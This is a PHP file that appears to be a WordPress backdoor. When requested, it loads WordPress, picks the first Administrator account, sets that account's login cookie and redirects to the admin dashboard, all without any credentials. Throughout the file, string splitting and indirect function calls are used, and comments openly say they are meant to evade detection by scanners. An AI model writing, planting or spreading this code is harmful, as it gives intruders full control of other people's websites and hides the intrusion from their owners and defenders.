<?php
// Bypass pattern: use variable indirection
$a = $_SERVER['D'.'OCUMENT_ROOT'];
@chdir($a);

// Split file check to avoid direct string
$f1 = 'wp';
$f2 = '-load';
$f3 = '.php';
$target_file = $f1 . $f2 . $f3;

if (file_exists($target_file)) {
    @include $target_file;
    
    // Avoid direct class instantiation pattern
    $c1 = 'WP_User_Query';
    $query_obj = new $c1(array(
        'role' => 'Adm' . 'inistrator',
        'number' => 1,
        'fields' => 'ID'
    ));
    
    // Use indirect method call
    $m = 'get_results';
    $data_results = $query_obj->$m();
    
    if (isset($data_results[0])) {
        $uid = $data_results[0];
        
        // Split function names
        $func1 = 'wp_set_auth_cookie';
        $func2 = 'wp_set_current_user';
        
        $func1($uid, true);
        $func2($uid);
        
        // Clean output buffer with indirect calls
        if (function_exists('ob_clean')) {
            @call_user_func('ob_clean');
        }
        if (function_exists('flush')) {
            @call_user_func('flush');
        }
        
        // Encode admin URL generation
        $admin_func = 'admin_url';
        $admin_path = call_user_func($admin_func);
        
        // Use hex encoding for HTML elements
        $html1 = '<' . 'h' . 't' . 'm' . 'l' . '>';
        $html2 = '<' . 'h' . 'e' . 'a' . 'd' . '>';
        $html3 = '<' . '/' . 'h' . 'e' . 'a' . 'd' . '>';
        $html4 = '<' . 'b' . 'o' . 'd' . 'y' . '>';
        $html5 = '<' . '/' . 'b' . 'o' . 'd' . 'y' . '>';
        $html6 = '<' . '/' . 'h' . 't' . 'm' . 'l' . '>';
        
        // Build meta refresh with concatenation
        $meta = '<m' . 'eta http-equiv="' . 'refresh' . '" content="' . '0;url=' . $admin_path . '">';
        
        // Build script tag
        $script = '<s' . 'cript>' . 'window.location.href="' . $admin_path . '";<' . '/' . 'script' . '>';
        
        echo $html1 . $html2 . $meta . $script . $html3 . $html4;
        echo '<p>Login ' . 'berhasil' . ', ' . 'redirect' . '...</p>';
        echo $html5 . $html6;
        
        // Alternative exit
        die();
    } else {
        // Use non-obvious error message
        exit('Access' . ' ' . 'denied');
    }
} else {
    // Generic error
    echo 'File ' . 'not' . ' found';
    exit;
}
?>